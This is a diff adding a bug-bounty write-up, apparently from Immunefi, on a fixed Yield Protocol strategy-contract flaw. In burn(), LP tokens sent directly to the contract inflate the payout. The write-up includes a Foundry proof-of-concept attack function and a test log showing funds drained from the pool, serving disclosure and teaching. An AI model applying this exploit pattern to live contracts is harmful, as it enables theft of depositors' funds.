@@ -95,6 +95,124 @@ Date: April 28th, 2023
 
 Bounty: $95,000 USDC
 
+### TL;DR
+
+
+
+### Vulnerability Analysis
+
+Yield Protocol is a DeFi protocol that enables fixed-rate, fixed-term loan options between borrowers and lenders.
+
+The protocol facilitates these transactions via `fyTokens` (fixed yield tokens), a type of `ERC-20` token that can be exchanged one-to-one for an underlying asset upon reaching a predetermined maturity date.
+
+The vulnerability is associated with the [strategy contract](https://arbiscan.io/address/0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0#code) of the protocol, which enables liquidity providers to deposit combined liquidity to a `YieldSpace` Pool.
+
+By depositing funds into the strategy contract, liquidity providers can mint strategy tokens. The amount of strategy tokens they receive corresponds proportionately to their deposit amount, allowing them to burn and redeem the LP tokens as well as any gain in fees/interest later.
+
+This vulnerability is associated with the burning shares functionality `burn(address to)` of the strategy contract which is responsible for burning the strategy tokens and allowing the user to withdraw the LP tokens:
+
+```solidity
+    function burn(address to)
+        external
+        isState(State.INVESTED)
+        returns (uint256 poolTokensObtained)
+    {
+        // Caching
+        IPool pool_ = pool;
+        uint256 poolCached_ = poolCached;
+        uint256 totalSupply_ = _totalSupply;
+
+        // Burn strategy tokens
+        uint256 burnt = _balanceOf[address(this)];
+        _burn(address(this), burnt);
+
+        poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
+        pool_.safeTransfer(address(to), poolTokensObtained);
+
+        // Update pool cache
+        poolCached = poolCached_ - poolTokensObtained;
+    }
+```
+
+Initially, the contract’s strategy tokens are burned. Then, the amount of liquidity pool tokens to be acquired are calculated based on the LP tokens contained in the strategy contract and are transferred to the designated address.
+
+The pool tokens to be returned to the caller are calculated by:
+
+```solidity
+poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
+```
+
+This calculation is based on the LP tokens balance of the current strategy contract which could be inflated by sending the pool tokens directly to it.
+
+The attacker has control over `pool.balanceOf(address(this))`, which allows them to inflate the pool tokens returned, by transferring a specific amount of pool tokens directly to the strategy contract before burning the strategy shares tokens.
+
+As the pool tokens remain within the Strategy contract, the attacker making the call can mint the share tokens and then burn them back to retrieve the pool tokens that were utilized to inflate the calculation.
+
+### PoC:
+
+- Clone the Immunefi bugfix review repository: `git clone https://github.com/immunefi-team/bugfix-reviews-pocs.git`
+- Run `forge test -vvv --match-path ./test/YieldProtocol/AttackTest.t.sol`
+
+Attack function:
+
+```solidity
+    function _executeAttack() internal {
+        console.log("\n>>> Execute attack\n");
+
+        //burning of strategy tokens
+        uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);
+
+        //burning remaing part of LP tokens sent to strategy
+        strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
+        strategyYSDAI6MMS.burn(ada);
+
+        //retrieving and converting all tokens to base token
+        FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
+        FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
+        FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
+        FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.
+
+        console.log("Tokens Burnt : ",tokensBurnt);
+
+        _completeAttack();
+    
+    }
+```
+
+Log output:
+
+```
+Ran 1 test for test/YieldProtocol/AttackTest.t.sol:AttackTest
+[PASS] testAttack() (gas: 677227)
+Logs:
+  
+>>> Initiate attack
+
+  Tokens Obtained :  20916988492243432153263
+  
+>>> Execute attack
+
+  Tokens Burnt :  32081082781615545896437
+  
+>>> Attack complete
+
+  holder gain in base wei :  11096784340278200659569
+  pool gain in base wei :  -11096784340278200659569
+  Strategy gain in base wei :  0
+  holder gain in FYToken :  0
+  pool gain in FYToken :  0
+  Strategy gain in FYToken :  0
+  holder gain in LPToken :  0
+  pool gain in LPToken :  0
+  Strategy gain in LPToken :  -11164094289372113743173
+  Pool base token amount before transactions: 1.3330628639753853259506e22
+  Pool base token amount after transactions: 2.233844299475652599937e21
+  holder base token amount before transactions: 1e24
+  holder base token amount after transactions: 1.011096784340278200659569e24
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.61s (6.15s CPU time)
+```
+
 # 3. Silo Finance - Logic Error
 
 Reported by: @kankodu
